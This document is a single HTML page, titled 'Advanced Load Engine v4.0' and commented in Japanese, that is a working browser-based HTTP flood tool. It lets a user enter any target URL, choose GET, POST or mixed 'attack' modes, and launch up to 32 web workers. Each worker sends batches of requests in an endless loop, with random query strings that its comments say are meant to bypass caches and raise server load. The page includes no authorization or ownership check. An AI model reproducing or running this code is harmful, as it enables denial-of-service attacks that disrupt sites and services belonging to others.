<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Load Engine v4.0</title>
    <style>
        :root { --bg: #050505; --green: #00ff41; --red: #ff3131; --panel: #111; --border: #222; }
        body { background: var(--bg); color: var(--green); font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; justify-content: center; }
        .main-frame { width: 100%; max-width: 1000px; border: 2px solid var(--border); background: var(--panel); padding: 20px; box-shadow: 0 0 30px rgba(0,255,65,0.1); }
        .top-bar { border-bottom: 2px solid var(--border); margin-bottom: 20px; padding-bottom: 10px; display: flex; justify-content: space-between; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .control-group { background: #000; padding: 15px; border: 1px solid var(--border); }
        label { display: block; font-size: 0.75rem; color: #888; margin: 10px 0 5px; }
        input, select { width: 100%; background: #0a0a0a; border: 1px solid var(--border); color: var(--green); padding: 8px; box-sizing: border-box; }
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        button { flex: 1; padding: 12px; font-weight: bold; cursor: pointer; border: none; transition: 0.2s; text-transform: uppercase; }
        #startBtn { background: var(--green); color: #000; }
        #stopBtn { background: var(--red); color: #fff; }
        button:hover { filter: brightness(1.2); }
        .monitor { background: #000; border: 1px solid var(--border); padding: 15px; display: grid; grid-template-columns: 1fr; gap: 10px; }
        .stat-item { border-left: 3px solid var(--green); padding-left: 15px; }
        .stat-val { font-size: 2.2rem; display: block; color: #fff; text-shadow: 0 0 10px var(--green); }
        #log { font-size: 0.7rem; color: #444; height: 100px; overflow-y: auto; background: #000; border: 1px solid var(--border); padding: 5px; margin-top: 15px; }
        .tag { font-size: 0.6rem; background: var(--green); color: #000; padding: 2px 5px; margin-right: 5px; }
    </style>
</head>
<body>

<div class="main-frame">
    <div class="top-bar">
        <span>[STATUS: ONLINE] LOAD_GEN_v4.0</span>
        <span>BROWSER_THREADS_ACTIVE</span>
    </div>

    <div class="grid">
        <div class="control-group">
            <label>TARGET ENDPOINT</label>
            <input type="url" id="target" value="https://example.com">
            
            <label>ATTACK TYPE (MIXED = HIGH LOAD)</label>
            <select id="mode">
                <option value="MIXED">Mixed (GET/POST/HEAD/PUT)</option>
                <option value="POST">POST Flood</option>
                <option value="GET">GET Flood</option>
            </select>

            <label>PARALLEL WORKERS (MAX 32)</label>
            <input type="number" id="workers" value="8" min="1" max="32">

            <label>BATCH INTENSITY (PER LOOP)</label>
            <input type="number" id="batch" value="25" min="1" max="100">

            <div class="btn-group">
                <button id="startBtn">Engage</button>
                <button id="stopBtn">Terminate</button>
            </div>
        </div>

        <div class="monitor">
            <div class="stat-item"><small>RPS (REAL-TIME)</small><span id="rps" class="stat-val">0</span></div>
            <div class="stat-item"><small>TOTAL PAYLOADS SENT</small><span id="total" class="stat-val">0</span></div>
            <div id="log">SYSTEM INITIALIZED...</div>
        </div>
    </div>
</div>

<script>
// --- マルチベクトル型負荷生成 Worker ---
const engineCode = `
    let active = false;
    const methods = ['GET', 'POST', 'HEAD', 'PUT'];
    
    self.onmessage = async (e) => {
        const { url, mode, batch, cmd } = e.data;
        if (cmd === 'start') {
            active = true;
            while (active) {
                const batchPromises = [];
                for (let i = 0; i < batch; i++) {
                    const method = mode === 'MIXED' ? methods[Math.floor(Math.random() * methods.length)] : mode;
                    
                    // サーバー側のキャッシュを貫通させ、解析負荷を上げるためのランダムデータ
                    const randomUrl = url + '?q=' + btoa(Math.random()).substring(0, 8);
                    
                    const p = fetch(randomUrl, {
                        method: method,
                        mode: 'no-cors',
                        cache: 'no-store',
                        referrerPolicy: 'no-referrer',
                        // POST/PUTの場合はフェイクのペイロードを送信
                        body: (method === 'POST' || method === 'PUT') ? JSON.stringify({data: Math.random()}) : null
                    }).then(() => self.postMessage('hit'))
                      .catch(() => self.postMessage('hit'));
                    
                    batchPromises.push(p);
                }
                // バッチが完了したら次のバーストへ
                await Promise.allSettled(batchPromises);
                await new Promise(r => setTimeout(r, 5));
            }
        } else { active = false; }
    };
`;

const blob = new Blob([engineCode], { type: 'application/javascript' });
const workerUrl = URL.createObjectURL(blob);
let workers = [];
let count = 0;
let lastCount = 0;

const log = (msg) => {
    const l = document.getElementById('log');
    l.prepend(\`[\${new Date().toLocaleTimeString()}] \${msg}\\n\`);
};

document.getElementById('startBtn').onclick = () => {
    if (workers.length > 0) return;
    const config = {
        url: document.getElementById('target').value,
        mode: document.getElementById('mode').value,
        workers: parseInt(document.getElementById('workers').value),
        batch: parseInt(document.getElementById('batch').value)
    };

    if (!config.url.startsWith('https')) {
        alert("SECURITY ERROR: HTTPS is required.");
        return;
    }

    count = 0; lastCount = 0;
    for (let i = 0; i < config.workers; i++) {
        const w = new Worker(workerUrl);
        w.onmessage = () => count++;
        w.postMessage({ cmd: 'start', ...config });
        workers.push(w);
    }
    log(\`ATTACK ENGAGED: \${config.mode} mode on \${config.url}\`);
};

document.getElementById('stopBtn').onclick = () => {
    workers.forEach(w => w.terminate());
    workers = [];
    log("SYSTEM HALTED. STANDING BY.");
};

setInterval(() => {
    const currentRps = count - lastCount;
    lastCount = count;
    document.getElementById('rps').innerText = currentRps.toLocaleString();
    document.getElementById('total').innerText = count.toLocaleString();
}, 1000);
</script>

</body>
</html>
